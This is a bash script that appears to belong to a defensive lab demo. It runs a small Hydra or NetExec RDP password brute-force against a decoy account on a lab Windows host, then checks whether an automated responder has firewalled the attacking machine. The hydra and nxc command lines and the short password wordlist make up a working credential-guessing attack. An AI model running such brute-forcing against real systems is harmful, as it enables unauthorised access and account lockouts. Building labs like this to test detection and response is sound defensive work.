#!/usr/bin/env bash
# RDP brute-force attack runner (run on Kali).
#
# Sends six wrong passwords over RDP to one account on the Windows target.
# Five failures is the responder's threshold, so a single run is enough to
# get the attacker firewalled; the sixth attempt should fail to connect.
#
# The default account is a DECOY ("labuser"), not Administrator. Repeated
# demo runs add up toward Windows' account-lockout threshold, and locking a
# decoy is harmless; locking the admin you RDP in with is not. The account
# doesn't even need to exist: failures against unknown usernames are logged
# as 4625 too.
#
# Usage:
#   ./attacker/run-attack.sh
#   ./attacker/run-attack.sh --target 10.10.10.40 --user labuser
#   ./attacker/run-attack.sh --tool nxc          # NetExec instead of Hydra
#   ./attacker/run-attack.sh --dry-run

set -euo pipefail

TARGET="10.10.10.40"
TARGET_USER="labuser"
TOOL="hydra"
DRY_RUN=0

usage() {
    awk 'NR > 1 && /^#/ { sub(/^# ?/, ""); print; next } NR > 1 { exit }' "$0"
    exit "${1:-0}"
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --target)  TARGET="${2:?--target needs a value}"; shift 2 ;;
        --user)    TARGET_USER="${2:?--user needs a value}"; shift 2 ;;
        --tool)    TOOL="${2:?--tool needs hydra or nxc}"; shift 2 ;;
        --dry-run) DRY_RUN=1; shift ;;
        -h|--help) usage 0 ;;
        *)         echo "Unknown arg: $1" >&2; usage 1 ;;
    esac
done

WORDLIST="$(mktemp --suffix=.pw.txt)"
trap 'rm -f "$WORDLIST"' EXIT
printf '%s\n' password 123456 letmein qwerty admin welcome1 > "$WORDLIST"

case "$TOOL" in
    # -t 1: Hydra's RDP module is unreliable with parallel tasks.
    hydra) CMD=(hydra -l "$TARGET_USER" -P "$WORDLIST" -t 1 -V "rdp://${TARGET}") ;;
    nxc)   CMD=(nxc rdp "$TARGET" -u "$TARGET_USER" -p "$WORDLIST") ;;
    *)     echo "ERROR: --tool must be hydra or nxc" >&2; exit 2 ;;
esac

echo "==> Target:   ${TARGET}:3389"
echo "==> User:     ${TARGET_USER}"
echo "==> Tool:     ${TOOL} (6 passwords)"
echo "==> Command:  ${CMD[*]}"
echo

if [[ $DRY_RUN -eq 1 ]]; then
    echo "[dry-run] not executing"
    exit 0
fi

command -v "${CMD[0]}" >/dev/null || { echo "ERROR: ${CMD[0]} not installed." >&2; exit 2; }

if ! timeout 3 bash -c "</dev/tcp/${TARGET}/3389" 2>/dev/null; then
    echo "ERROR: ${TARGET}:3389 is not reachable (VM down, RDP off, or already banned?)." >&2
    exit 3
fi

# Connection errors near the end are the expected result: the ban worked.
"${CMD[@]}" || true

echo
echo "==> Post-attack check: is 3389 still reachable from here?"
if timeout 3 bash -c "</dev/tcp/${TARGET}/3389" 2>/dev/null; then
    echo "    reachable: not banned (yet). Check the log on the target."
else
    echo "    unreachable: the responder's firewall rule is blocking this host."
fi
